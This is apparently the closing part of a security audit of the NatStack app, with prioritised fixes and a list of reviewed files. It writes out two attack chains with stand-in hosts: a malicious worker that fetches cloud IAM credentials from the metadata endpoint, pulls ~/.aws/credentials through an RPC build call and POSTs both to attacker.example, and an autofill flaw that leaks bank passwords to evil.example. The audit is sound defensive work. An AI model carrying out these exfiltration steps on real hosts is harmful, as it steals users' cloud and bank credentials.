The most concerning path a malicious agent can walk today, assuming it authors one worker:

1. Worker's bundled JS calls `fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>/")` — workerd permits it per `allow:["public","local"]` (S1).
2. Response bytes return; worker extracts `AccessKeyId` / `SecretAccessKey` / `Token`.
3. Worker calls `fetch("http://127.0.0.1:<rpcPort>/rpc", { headers:{authorization:"Bearer "+env.RPC_AUTH_TOKEN, "content-type":"application/json"}, body: JSON.stringify({service:"build", method:"getBuildNpm", args:["lodash", "file:/Users/dev/.aws/credentials", []]})})` — via S5, pulls `~/.aws/credentials` into the build cache and receives the bytes back as a bundled string.
4. Worker POSTs the bundle body plus the IAM token to `https://attacker.example/exfil` — workerd allows it (S1).

Total: no code runs in the main server process, no token was leaked externally, nothing was written to disk, but cloud creds and local AWS creds have left the host.

A second chain, targeting the UI host:

1. User opens `https://bank.com` in a NatStack browser panel. Autofill stores `user@bank` / `hunter2`.
2. `bank.com/transactions` legitimately embeds `<iframe src="https://analytics.example.com/embed">`.
3. `analytics.example.com` happens to ship a form with `<input type=password>` (or is compromised later to).
4. NatStack's AutofillManager (S3) injects bank creds into the iframe's main-world DOM.
5. `analytics.example.com` JS reads the password from DOM and sends it to `https://evil.example/`.

---

## Recommendations, by priority

1. **Wire the egress proxy, or dismantle it.** Dead code claiming to enforce security is worse than no code, because it invites reviewers to assume a control exists. If the intent is to ship the proxy, make workerd's `globalOutbound` point at it (plausibly via `externalServer` + `http` style forwarding), remove `"local"` from every worker network allow-list, and add a deny-list for RFC1918 / link-local. If the intent is that workers' outbound is unrestricted, document that explicitly and remove the proxy and its tests.
2. **Gate CONNECT in the proxy**. Enforce attribution; match target to a provider's `apiBase`; DNS-resolve before `netConnect` and deny loopback/link-local/private; cap port to 443 + allow-list.
3. **Fix autofill sub-frame injection**. Origin-match before injecting; prefer isolated worlds; never fill into cross-origin frames.
4. **Harden every git CLI invocation**. Insert `--` before user-controlled refs, validate ref shape, replace shell-mode `execSync` with `execFileSync`.
5. **Tighten `getBuildNpm` version validation**. Whitelist semver-ish shapes only. Consider gating behind `shell` callerKind.
6. **Restrict CDP**: bind loopback, move token out of URL, add a method allow-list.
7. **Bind every local service to `127.0.0.1`/`::1`** unless there is a documented reason to be LAN-reachable.
8. **Replace dynamic UPDATE building with a fixed mapping** as a style rule, even though today it's safe.
9. **Allow-list `spawn` environment** for workerd.
10. **Close the `FsService` TOCTOU by switching to fd-based ops** for anything in the `readFile`/`writeFile`/`stat` path.

---

## Files reviewed

- `src/server/services/egressProxy.ts`
- `src/server/services/workerdService.ts`, `src/server/workerdManager.ts`
- `src/server/services/workerService.ts`, `src/server/services/workerLogService.ts`
- `src/server/services/buildService.ts`, `src/server/services/gitService.ts`, `src/server/services/panelService.ts`
- `src/server/buildV2/builder.ts`, `src/server/buildV2/externalDeps.ts`, `src/server/buildV2/effectiveVersion.ts`, `src/server/buildV2/index.ts`
- `src/server/panelRuntimeRegistration.ts`, `src/server/headlessServiceRegistration.ts`
- `src/server/cdpBridge.ts`
- `src/main/shellCore/createElectronShellCore.ts`, `src/main/shellCore/panelStoreSqlite.ts`
- `src/main/cdpServer.ts`
- `src/main/adblock/adBlockManager.ts`, `src/main/services/adblockService.ts`
- `src/main/autofill/autofillManager.ts`, `src/main/autofill/contentScript.ts`
- `packages/git-server/src/server.ts`, `packages/git-server/src/auth.ts`, `packages/git-server/src/githubCloner.ts`
- `packages/git/src/*` (surface only)
- `packages/harness/src/index.ts`, `packages/harness/src/tools/path-utils.ts`, `packages/harness/src/tools/grep.ts`, `packages/harness/src/pi-extension-runtime.ts`
- `packages/process-adapter/src/index.ts`
- `packages/shared/src/fsService.ts`, `packages/shared/src/pathUtils.ts`, `packages/shared/src/panelFactory.ts`
- `packages/shared/src/db/panelPersistence.ts`, `packages/shared/src/db/panelSearchIndex.ts`, `packages/shared/src/db/panelSchema.ts`, `packages/shared/src/db/databaseManager.ts`

Tests (cross-referenced for behaviour, not audited for coverage): `workerdService.test.ts`, `workerdManager.test.ts`, `packages/shared/src/db/databaseManager.test.ts`, `packages/shared/src/db/panelPersistence.test.ts`, `packages/harness/src/tools/__tests__/*`.
